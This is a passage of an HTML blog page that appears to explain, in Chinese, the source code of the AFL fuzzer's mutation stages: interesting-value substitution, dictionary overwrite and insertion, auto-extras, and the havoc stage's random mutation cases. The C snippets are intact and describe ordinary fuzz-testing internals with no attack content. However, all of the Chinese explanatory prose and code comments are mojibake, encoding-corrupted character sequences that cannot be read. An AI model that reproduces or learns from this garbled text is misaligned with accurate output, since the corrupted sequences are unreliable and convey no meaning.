class="code"><pre><span class="line"><span class="comment">// 8ä½æœ‰è¶£å€¼</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    u8 orig = out_buf[i];</span><br><span class="line">    <span class="keyword">if</span> (!eff_map[<span class="built_in">EFF_APOS</span>(i)]) &#123;</span><br><span class="line">        stage_max -= <span class="built_in">sizeof</span>(interesting_8);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="built_in">sizeof</span>(interesting_8); j++) &#123;</span><br><span class="line">        <span class="comment">// é¿å…ä¸ä¹‹å‰å˜å¼‚é‡å¤</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">could_be_bitflip</span>(orig ^ (u8)interesting_8[j]) ||</span><br><span class="line">            <span class="built_in">could_be_arith</span>(orig, (u8)interesting_8[j], <span class="number">1</span>)) &#123;</span><br><span class="line">            stage_max--;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        out_buf[i] = interesting_8[j];</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        out_buf[i] = orig;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰è¶£å€¼åŒ…æ‹¬ï¼š</p><ul><li><p>8ä½ï¼š-128, -1, 0, 1, 16, 32, 64, 100, 127</p></li><li><p>16ä½ï¼š-32768, -129, 128, 255, 256, 512, 1000, 1024, 4096, 32767</p></li><li><p>32ä½ï¼šè¾¹ç•Œå€¼å’Œå¸¸ç”¨çš„å¤§æ•´æ•°</p></li></ul><h4 id="å­—å…¸å˜å¼‚"><a href="#å­—å…¸å˜å¼‚" class="headerlink" title="å­—å…¸å˜å¼‚"></a>å­—å…¸å˜å¼‚</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">extra_data</span> &#123;</span><br><span class="line">  u8* data;        <span class="comment">/* å­—å…¸tokenæ•°æ® */</span></span><br><span class="line">  u32 len;         <span class="comment">/* å­—å…¸tokené•¿åº¦ */</span></span><br><span class="line">  u32 hit_cnt;     <span class="comment">/* åœ¨è¯­æ–™åº“ä¸­çš„ä½¿ç”¨è®¡æ•° */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å­—å…¸æ¡ç›®ç»“æ„ä½“</p><p>ç›¸å…³å˜é‡å’Œå¸¸é‡ï¼š</p><ul><li><p><code>extras[]</code>: ç”¨æˆ·æä¾›çš„å­—å…¸æ¡ç›®æ•°ç»„</p></li><li><p><code>extras_cnt</code>: ç”¨æˆ·å­—å…¸æ¡ç›®æ€»æ•°</p></li><li><p><code>a_extras[]</code>: è‡ªåŠ¨æå–çš„å­—å…¸æ¡ç›®æ•°ç»„</p></li><li><p><code>a_extras_cnt</code>: è‡ªåŠ¨å­—å…¸æ¡ç›®æ€»æ•°</p></li><li><p><code>MAX_DICT_FILE = 128</code>: å•ä¸ªå­—å…¸tokenæœ€å¤§é•¿åº¦</p></li><li><p><code>MAX_DET_EXTRAS = 200</code>: ç¡®å®šæ€§æ­¥éª¤ä¸­ä½¿ç”¨çš„ç”¨æˆ·å­—å…¸tokenæœ€å¤§æ•°é‡</p></li><li><p><code>USE_AUTO_EXTRAS = 50</code>: å®é™…ç”¨äºæ¨¡ç³Šæµ‹è¯•çš„è‡ªåŠ¨å­—å…¸tokenæ•°é‡</p></li><li><p><code>MAX_AUTO_EXTRAS = 500</code>: å†…å­˜ä¸­ä¿å­˜çš„è‡ªåŠ¨å­—å…¸tokenå€™é€‰æ•°é‡</p></li></ul><h5 id="è¦†ç›–å˜å¼‚"><a href="#è¦†ç›–å˜å¼‚" class="headerlink" title="è¦†ç›–å˜å¼‚"></a>è¦†ç›–å˜å¼‚</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">stage_max = extras_cnt * len;  <span class="comment">// æ€»å˜å¼‚æ¬¡æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;           <span class="comment">// éå†è¾“å…¥æ–‡ä»¶æ¯ä¸ªä½ç½®</span></span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; extras_cnt; j++) &#123;  <span class="comment">// éå†æ¯ä¸ªå­—å…¸token</span></span><br><span class="line">    <span class="comment">// è·³è¿‡æ¡ä»¶æ£€æŸ¥</span></span><br><span class="line">    <span class="keyword">if</span> ((extras_cnt &gt; MAX_DET_EXTRAS &amp;&amp; <span class="built_in">UR</span>(extras_cnt) &gt;= MAX_DET_EXTRAS) ||</span><br><span class="line">        extras[j].len &gt; len - i ||  <span class="comment">// tokené•¿åº¦è¶…å‡ºå‰©ä½™ç©ºé—´</span></span><br><span class="line">        !<span class="built_in">memcmp</span>(extras[j].data, out_buf + i, extras[j].len) ||  <span class="comment">// tokenå·²å­˜åœ¨</span></span><br><span class="line">        !<span class="built_in">memchr</span>(eff_map + <span class="built_in">EFF_APOS</span>(i), <span class="number">1</span>, <span class="built_in">EFF_SPAN_ALEN</span>(i, extras[j].len))) &#123;</span><br><span class="line">      stage_max--;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ‰§è¡Œè¦†ç›–å˜å¼‚</span></span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf + i, extras[j].data, extras[j].len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ‰§è¡Œæ¨¡ç³Šæµ‹è¯•</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    </span><br><span class="line">    stage_cur++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// æ¢å¤è¢«è¦†ç›–çš„å†…å­˜</span></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf + i, in_buf + i, last_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹è¾“å…¥æ–‡ä»¶çš„æ¯ä¸ªå­—èŠ‚ä½ç½®éƒ½å°è¯•å­—å…¸tokenè¦†ç›–ï¼Œå½“å­—å…¸æ¡ç›®è¿‡å¤šæ—¶ï¼Œéšæœºè·³è¿‡ä¸€äº›æ¡ç›®ï¼Œè·³è¿‡é•¿åº¦ä¸åˆé€‚ã€å·²å­˜åœ¨çš„æ¡ç›®</p><h5 id="æ’å…¥å˜å¼‚"><a href="#æ’å…¥å˜å¼‚" class="headerlink" title="æ’å…¥å˜å¼‚"></a>æ’å…¥å˜å¼‚</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Insertion of user-supplied extras. */</span></span><br><span class="line">stage_name  = <span class="string">&quot;user extras (insert)&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;ext_UI&quot;</span>;</span><br><span class="line">stage_cur   = <span class="number">0</span>;</span><br><span class="line">stage_max   = extras_cnt * (len + <span class="number">1</span>);</span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line">ex_tmp = <span class="built_in">ck_alloc</span>(len + MAX_DICT_FILE);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= len; i++) &#123;</span><br><span class="line">  stage_cur_byte = i;</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; extras_cnt; j++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (len + extras[j].len &gt; MAX_FILE) &#123;</span><br><span class="line">      stage_max--; </span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Insert token */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ex_tmp + i, extras[j].data, extras[j].len);</span><br><span class="line">    <span class="comment">/* Copy tail */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ex_tmp + i + extras[j].len, out_buf + i, len - i);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, ex_tmp, len + extras[j].len)) &#123;</span><br><span class="line">      <span class="built_in">ck_free</span>(ex_tmp);</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line">    stage_cur++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Copy head */</span></span><br><span class="line">  ex_tmp[i] = out_buf[i];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ¯ä¸ªå¯èƒ½ä½ç½®æ’å…¥å­—å…¸tokenï¼Œä¸è¦†ç›–åŸæœ‰æ•°æ®</p><h5 id="è‡ªåŠ¨å­—å…¸å¤„ç†"><a href="#è‡ªåŠ¨å­—å…¸å¤„ç†" class="headerlink" title="è‡ªåŠ¨å­—å…¸å¤„ç†"></a>è‡ªåŠ¨å­—å…¸å¤„ç†</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">stage_name  = <span class="string">&quot;auto extras (over)&quot;</span>;</span><br><span class="line">stage_max   = <span class="built_in">MIN</span>(a_extras_cnt, USE_AUTO_EXTRAS) * len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="built_in">MIN</span>(a_extras_cnt, USE_AUTO_EXTRAS); j++) &#123;</span><br><span class="line">    <span class="comment">// ä¸‰é‡è¿‡æ»¤æ¡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> (a_extras[j].len &gt; len - i ||  <span class="comment">// é•¿åº¦æ£€æŸ¥</span></span><br><span class="line">        !<span class="built_in">memcmp</span>(a_extras[j].data, out_buf + i, a_extras[j].len) ||  <span class="comment">// é‡å¤æ£€æŸ¥</span></span><br><span class="line">        !<span class="built_in">memchr</span>(eff_map + <span class="built_in">EFF_APOS</span>(i), <span class="number">1</span>, <span class="built_in">EFF_SPAN_ALEN</span>(i, a_extras[j].len))) &#123;  <span class="comment">// æ•ˆæœæ£€æŸ¥</span></span><br><span class="line">      stage_max--;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ‰§è¡Œè¦†ç›–</span></span><br><span class="line">    last_len = a_extras[j].len;</span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf + i, a_extras[j].data, last_len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æµ‹è¯•å˜å¼‚ç»“æœ</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    </span><br><span class="line">    stage_cur++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// æ¢å¤è¢«è¦†ç›–çš„å†…å­˜</span></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf + i, in_buf + i, last_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤„ç†åœ¨ä½ç¿»è½¬é˜¶æ®µè‡ªåŠ¨å‘ç°çš„å­—å…¸æ¡ç›®ï¼ŒåŒæ—¶åªåœ¨æœ‰æ•ˆå­—èŠ‚ä½æ‰ä¼šè¦†ç›–å¤„ç†</p><h3 id="HAVOCéšæœºå˜å¼‚é˜¶æ®µ"><a href="#HAVOCéšæœºå˜å¼‚é˜¶æ®µ" class="headerlink" title="HAVOCéšæœºå˜å¼‚é˜¶æ®µ"></a>HAVOCéšæœºå˜å¼‚é˜¶æ®µ</h3><p><code>UR</code>å®å®šä¹‰æ˜¯ä¸€ä¸ªå–éšæœºæ•°çš„æ“ä½œ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="built_in">UR</span>(<span class="number">15</span> + ((extras_cnt + a_extras_cnt) ? <span class="number">2</span> : <span class="number">0</span>))) &#123;</span><br></pre></td></tr></table></figure><p>å¦‚æœæœ‰å­—å…¸ï¼Œåˆ™å–<code>0-16</code>çš„é€‰é¡¹ï¼Œæ²¡å­—å…¸ï¼Œå–<code>0-14</code>çš„é€‰é¡¹</p><h4 id="ä½çº§å˜å¼‚æ“ä½œ-Cases-0-3"><a href="#ä½çº§å˜å¼‚æ“ä½œ-Cases-0-3" class="headerlink" title="ä½çº§å˜å¼‚æ“ä½œ (Cases 0-3)"></a>ä½çº§å˜å¼‚æ“ä½œ (Cases 0-3)</h4><p><strong>Case 0: å•æ¯”ç‰¹ç¿»è½¬</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">FLIP_BIT</span>(out_buf, <span class="built_in">UR</span>(temp_len &lt;&lt; <span class="number">3</span>));</span><br></pre></td></tr></table></figure><ul><li><p>éšæœºé€‰æ‹©æ–‡ä»¶ä¸­çš„ä»»æ„ä¸€ä¸ªæ¯”ç‰¹ä½è¿›è¡Œç¿»è½¬</p></li><li><p>è¿™æ˜¯æœ€ç»†ç²’åº¦çš„å˜å¼‚ï¼Œèƒ½å¤Ÿè§¦å‘å¾®å°çš„è¯­æ³•å˜åŒ–</p></li></ul><p><strong>Case 1: æœ‰è¶£å­—èŠ‚å€¼æ›¿æ¢</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out_buf[<span class="built_in">UR</span>(temp_len)] = interesting_8[<span class="built_in">UR</span>(<span class="built_in">sizeof</span>(interesting_8))];</span><br></pre></td></tr></table></figure><ul><li><p>å°†éšæœºä½ç½®çš„å­—èŠ‚æ›¿æ¢ä¸ºé¢„å®šä¹‰çš„â€æœ‰è¶£å€¼â€</p></li><li><p>æœ‰è¶£å€¼åŒ…æ‹¬ï¼š0, 1, -1, 127, -128ç­‰è¾¹ç•Œå€¼</p></li></ul><p><strong>Case 2: æœ‰è¶£16ä½å€¼æ›¿æ¢</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(u16*)(out_buf + <span class="built_in">UR</span>(temp_len - <span class="number">1</span>)) = </span><br><span class="line"> interesting_16[<span class="built_in">UR</span>(<span class="built_in">sizeof</span>(interesting_16) &gt;&gt; <span class="number">1</span>)];</span><br></pre></td></tr></table></figure><ul><li><p>éšæœºé€‰æ‹©å¤§ç«¯æˆ–å°ç«¯å­—èŠ‚åº</p></li><li><p>æ›¿æ¢ä¸º16ä½æœ‰è¶£å€¼ï¼š0, 1, -1, 32767, -32768ç­‰</p></li></ul><p><strong>Case 3: æœ‰è¶£32ä½å€¼æ›¿æ¢</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(u32*)(out_buf + <span class="built_in">UR</span>(temp_len - <span class="number">3</span>)) = </span><br><span class="line"> interesting_32[<span class="built_in">UR</span>(<span class="built_in">sizeof</span>(interesting_32) &gt;&gt; <span class="number">2</span>)];</span><br></pre></td></tr></table></figure><ul><li><p>åŒæ ·æ”¯æŒå¤§ç«¯&#x2F;å°ç«¯éšæœºé€‰æ‹©</p></li><li><p>æ›¿æ¢ä¸º32ä½æœ‰è¶£å€¼</p></li></ul><h4 id="ç®—æœ¯å˜å¼‚æ“ä½œ-Cases-4-9"><a href="#ç®—æœ¯å˜å¼‚æ“ä½œ-Cases-4-9" class="headerlink" title="ç®—æœ¯å˜å¼‚æ“ä½œ (Cases 4-9)"></a>ç®—æœ¯å˜å¼‚æ“ä½œ (Cases 4-9)</h4><p><strong>Cases 4-5: å­—èŠ‚çº§ç®—æœ¯è¿ç®—</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">out_buf[<span class="built_in">UR</span>(temp_len)] -= <span class="number">1</span> + <span class="built_in">UR</span>(ARITH_MAX);  <span class="comment">// å‡æ³•</span></span><br><span class="line">out_buf[<span class="built_in">UR</span>(temp_len)] += <span class="number">1</span> + <span class="built_in">UR</span>(ARITH_MAX);  <span class="comment">// åŠ æ³•</span></span><br></pre></td></tr></table></figure><p><strong>Cases 6-7: 16ä½ç®—æœ¯è¿ç®—</strong></p><p><strong>Cases 8-9: 32ä½ç®—æœ¯è¿ç®—</strong></p><h4 id="éšæœºå˜å¼‚æ“ä½œ-Case-10"><a href="#éšæœºå˜å¼‚æ“ä½œ-Case-10" class="headerlink" title="éšæœºå˜å¼‚æ“ä½œ (Case 10)"></a>éšæœºå˜å¼‚æ“ä½œ (Case 10)</h4><p><strong>Case 10: éšæœºå­—èŠ‚å¼‚æˆ–</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out_buf[<span class="built_in">UR</span>(temp_len)] ^= <span class="number">1</span> + <span class="built_in">UR</span>(<span class="number">255</span>);</span><br></pre></td></tr></table></figure><h4 id="ç»“æ„å˜å¼‚æ“ä½œ-Cases-11-14"><a href="#ç»“æ„å˜å¼‚æ“ä½œ-Cases-11-14" class="headerlink" title="ç»“æ„å˜å¼‚æ“ä½œ (Cases 11-14)"></a>ç»“æ„å˜å¼‚æ“ä½œ (Cases 11-14)</h4><p><strong>Cases 11-12: åˆ é™¤æ“ä½œ</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">del_len = <span class="built_in">choose_block_len</span>(temp_len - <span class="number">1</span>);</span><br><span class="line">del_from = <span class="built_in">UR</span>(temp_len - del_len + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memmove</span>(out_buf + del_from, out_buf + del_from + del_len,</span><br><span class="line">        temp_len - del_from - del_len);</span><br></pre></td></tr></table></figure><ul><li><p>éšæœºåˆ é™¤ä¸€ä¸ªæ•°æ®å—</p></li><li><p>åˆ é™¤é•¿åº¦ç”±choose_block_lenæ™ºèƒ½é€‰æ‹©</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u32 <span class="title">choose_block_len</span><span class="params">(u32 limit)</span> </span>&#123;</span><br><span class="line">  u32 min_value, max_value;</span><br><span class="line">  u32 rlim = <span class="built_in">MIN</span>(queue_cycle, <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> (!run_over10m) rlim = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">switch</span> (<span class="built_in">UR</span>(rlim)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:  min_value = <span class="number">1</span>;</span><br><span class="line">             max_value = HAVOC_BLK_SMALL;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:  min_value = HAVOC_BLK_SMALL;</span><br><span class="line">             max_value = HAVOC_BLK_MEDIUM;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>: </span><br><span class="line">             <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">10</span>)) &#123;</span><br><span class="line">               min_value = HAVOC_BLK_MEDIUM;</span><br><span class="line">               max_value = HAVOC_BLK_LARGE;</span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               min_value = HAVOC_BLK_LARGE;</span><br><span class="line">               max_value = HAVOC_BLK_XL;</span><br><span class="line">             &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (min_value &gt;= limit) min_value = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> min_value + <span class="built_in">UR</span>(<span class="built_in">MIN</span>(max_value, limit) - min_value + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ ¹æ®å½“å‰çš„å¾ªç¯æ•°ï¼Œéšæœºé€‰æ‹©ä¸€ä¸ªç­–ç•¥</p><p>ç¬¬ä¸€å±‚ï¼ˆcase 0ï¼‰ï¼šå°å—</p><ul><li><p>èŒƒå›´ï¼š1 åˆ° HAVOC_BLK_SMALL (32å­—èŠ‚)</p></li><li><p>é€‚ç”¨äºç²¾ç»†å˜å¼‚</p></li></ul><p>ç¬¬äºŒå±‚ï¼ˆcase 1ï¼‰ï¼šä¸­ç­‰å—</p><ul><li><p>èŒƒå›´ï¼šHAVOC_BLK_SMALL (32) åˆ° HAVOC_BLK_MEDIUM (128å­—èŠ‚)</p></li><li><p>å¹³è¡¡æ•ˆç‡å’Œè¦†ç›–é¢</p></li></ul><p>ç¬¬ä¸‰å±‚ï¼ˆdefaultï¼‰ï¼šå¤§å—ç­–ç•¥</p><ul><li><p>90%æ¦‚ç‡ï¼šHAVOC_BLK_MEDIUM (128) åˆ° HAVOC_BLK_LARGE (1500å­—èŠ‚)</p></li><li><p>10%æ¦‚ç‡ï¼šHAVOC_BLK_LARGE (1500) åˆ° HAVOC_BLK_XL (32768å­—èŠ‚)</p></li></ul></blockquote></li></ul><p><strong>Case 13: å…‹éš†&#x2F;æ’å…¥æ“ä½œ</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">u8  actually_clone = <span class="built_in">UR</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> (actually_clone) &#123;</span><br><span class="line">  <span class="comment">// 75%æ¦‚ç‡ï¼šå…‹éš†ç°æœ‰æ•°æ®å—</span></span><br><span class="line">  <span class="built_in">memcpy</span>(new_buf + clone_to, out_buf + clone_from, clone_len);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 25%æ¦‚ç‡ï¼šæ’å…¥å¸¸é‡å­—èŠ‚å—</span></span><br><span class="line">  <span class="built_in">memset</span>(new_buf + clone_to, <span class="built_in">UR</span>(<span class="number">2</span>) ? <span class="built_in">UR</span>(<span class="number">256</span>) : out_buf[<span class="built_in">UR</span>(temp_len)], clone_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Case 14: è¦†å†™æ“ä½œ</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">4</span>)) &#123;</span><br><span class="line">  <span class="comment">// 75%æ¦‚ç‡ï¼šç”¨ç°æœ‰æ•°æ®å—è¦†å†™</span></span><br><span class="line">  <span class="built_in">memmove</span>(out_buf + copy_to, out_buf + copy_from, copy_len);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 25%æ¦‚ç‡ï¼šç”¨å¸¸é‡å€¼è¦†å†™</span></span><br><span class="line">  <span class="built_in">memset</span>(out_buf + copy_to, <span class="built_in">UR</span>(<span class="number">2</span>) ? <span class="built_in">UR</span>(<span class="number">256</span>) : out_buf[<span class="built_in">UR</span>(temp_len)], copy_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å­—å…¸å˜å¼‚æ“ä½œ-Cases-15-16"><a href="#å­—å…¸å˜å¼‚æ“ä½œ-Cases-15-16" class="headerlink" title="å­—å…¸å˜å¼‚æ“ä½œ (Cases 15-16)"></a>å­—å…¸å˜å¼‚æ“ä½œ (Cases 15-16)</h4><p><strong>Case 15: å­—å…¸è¦†å†™</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!extras_cnt || (a_extras_cnt &amp;&amp; <span class="built_in">UR</span>(<span class="number">2</span>))) &#123;</span><br><span class="line">  <span class="comment">// ä½¿ç”¨è‡ªåŠ¨æ£€æµ‹çš„extras</span></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf + insert_at, a_extras[use_extra].data, extra_len);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// ä½¿ç”¨ç”¨æˆ·æä¾›çš„å­—å…¸</span></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf + insert_at, extras[use_extra].data, extra_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Case 16: å­—å…¸æ’å…¥</strong></p><p>ç±»ä¼¼Case 15ï¼Œä½†æ˜¯æ’å…¥è€Œéè¦†å†™éœ€è¦é‡æ–°åˆ†é…å†…å­˜å¹¶è°ƒæ•´æ–‡ä»¶å¤§å°</p><h4 id="å˜å¼‚è¿­ä»£åå¤„ç†"><a href="#å˜å¼‚è¿­ä»£åå¤„ç†" class="headerlink" title="å˜å¼‚è¿­ä»£åå¤„ç†"></a>å˜å¼‚è¿­ä»£åå¤„ç†</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, temp_len))</span><br><span class="line">  <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* out_buf might have been mangled a bit, so let&#x27;s restore it to its</span></span><br><span class="line"><span class="comment">   original size and shape. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (temp_len &lt; len) out_buf = <span class="built_in">ck_realloc</span>(out_buf, len);</span><br><span class="line">temp_len = len;</span><br><span class="line"><span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If we&#x27;re finding new stuff, let&#x27;s run for a bit longer, limits</span></span><br><span class="line"><span class="comment">   permitting. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (queued_paths != havoc_queued) &#123;</span><br><span class="line"></span><br><span class="line">  <span 